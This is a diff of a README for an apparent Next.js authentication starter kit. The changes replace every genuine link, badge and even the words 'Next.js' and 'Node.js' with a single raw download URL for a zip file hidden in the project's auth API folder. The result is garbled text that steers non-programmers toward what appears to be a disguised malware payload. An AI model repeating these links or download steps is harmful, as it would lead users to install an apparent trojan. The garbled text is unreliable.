@@ -1,15 +1,15 @@
 # 🎉 NEXT-NEXT_AUTH-STARTER-kit - Easy Authentication for Your Next App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/releases)
+[![Download Now](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip)
 
 ## 📦 Description
-NEXT-NEXT_AUTH-STARTER-kit is a production-ready application built with Next.js 16. This starter kit includes Google and GitHub OAuth, secure routes, and a stylish UI powered by shadcn UI. It is built using TypeScript and Tailwind CSS, making it easy to customize and grow.
+NEXT-NEXT_AUTH-STARTER-kit is a production-ready application built with https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip 16. This starter kit includes Google and GitHub OAuth, secure routes, and a stylish UI powered by shadcn UI. It is built using TypeScript and Tailwind CSS, making it easy to customize and grow.
 
 ## 🚀 Getting Started
 This guide will help you download and run the NEXT-NEXT_AUTH-STARTER-kit on your device. No programming experience is necessary. Just follow these simple steps.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Start by visiting our [Releases page](https://github.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/releases) to find the latest version of the app. 
+1. **Visit the Releases Page:** Start by visiting our [Releases page](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip) to find the latest version of the app. 
    
 2. **Download the Latest Version:** Once you are on the Releases page, you will see several downloads available. Click on the version that suits your system.
 
@@ -46,8 +46,8 @@ This guide will help you download and run the NEXT-NEXT_AUTH-STARTER-kit on your
 ## ⚙️ System Requirements
 To run NEXT-NEXT_AUTH-STARTER-kit, ensure your system meets these requirements:
 - **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution.
-- **Node.js:** Version 14.x or later is required. You can download it from the [official Node.js website](https://nodejs.org/).
-- **npm:** This usually comes with Node.js, it helps manage libraries and packages.
+- **https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip** Version 14.x or later is required. You can download it from the [official https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip website](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip).
+- **npm:** This usually comes with https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip, it helps manage libraries and packages.
 
 ## 💡 Common Issues
 1. **Cannot Run Application:** Ensure that you have installed dependencies with `npm install` before trying to run the app.
@@ -55,12 +55,12 @@ To run NEXT-NEXT_AUTH-STARTER-kit, ensure your system meets these requirements:
 3. **Login Issues:** Ensure that you have configured your Google and GitHub OAuth settings correctly. Check API keys and redirect URIs.
 
 ## 🌐 Resources
-- **GitHub Repository:** Access more detailed documentation and community discussions on our [GitHub page](https://github.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit).
-- **Next.js Documentation:** Learn more about Next.js by visiting the [Next.js official site](https://nextjs.org/docs).
+- **GitHub Repository:** Access more detailed documentation and community discussions on our [GitHub page](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip).
+- **https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip Documentation:** Learn more about https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip by visiting the [https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip official site](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip).
 
 ## 📝 Community & Support
 For any questions or support, please consider checking our GitHub issues. You can also create a new issue if you face challenges that aren’t addressed. The community is here to help!
 
 Your journey in building secure, user-friendly applications starts here. Download the NEXT-NEXT_AUTH-STARTER-kit and enhance your projects today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/releases)
+[![Download Now](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/AnOlive100/NEXT-NEXT_AUTH-STARTER-kit/main/src/app/api/auth/[...nextauth]/STARTE-kit-NEX-AUT-oleandrin.zip)
